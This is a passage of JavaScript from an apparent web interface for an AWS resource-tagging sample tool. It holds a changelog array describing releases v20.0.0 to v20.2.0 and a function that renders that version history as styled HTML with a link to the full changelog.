                    { tag: 'coverage', text: 'Added handlers for Amazon Keyspaces (CreateKeyspace), AWS Directory Service (CreateDirectory + CreateMicrosoftAD), and AWS CloudHSM v2 (CreateCluster + CreateHsm).' },
                    { tag: 'coverage', text: 'Added IAM permissions: ds:AddTagsToResource and cloudhsm:TagResource.' },
                    { tag: 'other',    text: 'AD Connector (ConnectDirectory) intentionally deferred — requires broader EventBridge prefix changes.' },
                ],
            },
            {
                version: 'v20.2.0',
                date: '2026-04-22',
                changes: [
                    { tag: 'other',    text: 'AutoDeployment=True only when scope is ALL; False when scope is specific accounts — prevents new OU accounts auto-receiving Lambda when customer explicitly scoped.' },
                    { tag: 'bugfix',   text: 'Cross-MPE conflict detection at deploy time (multi-account StackSet overlap + single-account same-account multi-Lambda with VPC precision).' },
                ],
            },
            {
                version: 'v20.1.0',
                date: '2026-04-21',
                changes: [
                    { tag: 'other',    text: 'Version visibility: SSM parameter /auto-map-tagger/<mpe>/version, CFN Output TemplateVersion, and Lambda cold-start log line.' },
                    { tag: 'other',    text: 'Batched IAM preflight: simulate-principal-policy over 21 deploy-time actions (26 for multi-account) in a single ~200ms call, catches explicitDeny + implicitDeny.' },
                    { tag: 'bugfix',   text: 'Stack-state preflight: catches CREATE_IN_PROGRESS / ROLLBACK_COMPLETE / ROLLBACK_FAILED stuck states with specific remediation commands.' },
                ],
            },
            {
                version: 'v20.0.0',
                date: '2026-04-18',
                changes: [
                    { tag: 'bugfix',   text: 'Recognize RGTA ThrottledException variant (with "ed") in addition to ThrottlingException — 8-account deploys no longer skip the SQS retry budget on RGTA throttles.' },
                    { tag: 'perf',     text: 'Parallelize StackSet deploy/delete with OperationPreferences {Max=100%, Tolerance=100%, RegionConcurrency=PARALLEL} — hours → ~15–20 min for 8-account deployments.' },
                    { tag: 'bugfix',   text: 'SSM parameter ARN missing "/" separator for flat parameter names — previously broke tagging for non-hierarchical parameter names.' },
                    { tag: 'bugfix',   text: '4 latent bugs from proactive audit: Lambda Layers untaggable, Classic ELB routing, STS credential refresh, CreateSnapshot multi-service collision.' },
                    { tag: 'coverage', text: 'WAFv2 (WebACL, IPSet) and CodeDeploy (Application, DeploymentGroup) handlers.' },
                    { tag: 'other',    text: 'Resilient SQS pipeline: EventBridge → SQS (14-day retention) → Lambda with DLQ + SNS alarm.' },
                ],
            },
        ];

        function renderVersionHistory() {
            const tagLabels = {
                bugfix:   { label: t('ui_version_tag_bugfix'),   color: '#d13212' },
                coverage: { label: t('ui_version_tag_coverage'), color: '#1d8102' },
                breaking: { label: t('ui_version_tag_breaking'), color: '#ba1e04' },
                security: { label: t('ui_version_tag_security'), color: '#9d1c2a' },
                perf:     { label: t('ui_version_tag_perf'),     color: '#0073bb' },
                other:    { label: t('ui_version_tag_other'),    color: '#687078' },
            };
            const entries = VERSION_HISTORY.map(v => {
                const isCurrent = v.version === TEMPLATE_VERSION;
                const header = `<div style="margin-top:14px;margin-bottom:4px;">
                    <strong style="font-size:14px;color:#16191f;">${v.version}</strong>
                    <span style="color:#687078;font-size:12px;"> — ${t('ui_version_released')} ${v.date}</span>
                    ${isCurrent ? `<span style="margin-left:8px;padding:2px 6px;background:#e0f2e5;color:#1d8102;border-radius:3px;font-size:11px;font-weight:600;">${t('ui_version_current')}</span>` : ''}
                </div>`;
                const bullets = v.changes.map(c => {
                    const tag = tagLabels[c.tag] || tagLabels.other;
                    return `<li style="margin:4px 0;line-height:1.5;">
                        <span style="display:inline-block;min-width:72px;padding:1px 6px;background:${tag.color}1a;color:${tag.color};border-radius:3px;font-size:10px;font-weight:600;text-transform:uppercase;margin-right:6px;vertical-align:middle;">${tag.label}</span>
                        <span style="font-size:13px;color:#16191f;">${c.text}</span>
                    </li>`;
                }).join('');
                return header + `<ul style="margin:0;padding-left:0;list-style:none;">${bullets}</ul>`;
            }).join('');
            const link = `<div style="margin-top:14px;padding-top:10px;border-top:1px solid #eaeded;font-size:12px;">
                <a href="https://github.com/aws-samples/sample-auto-map-tagger/blob/main/CHANGELOG.md" target="_blank" rel="noopener" style="color:#0073bb;">${t('ui_version_full_changelog')} →</a>
            </div>`;
            return entries + link;
        }

        // --- Landing mode selection ---
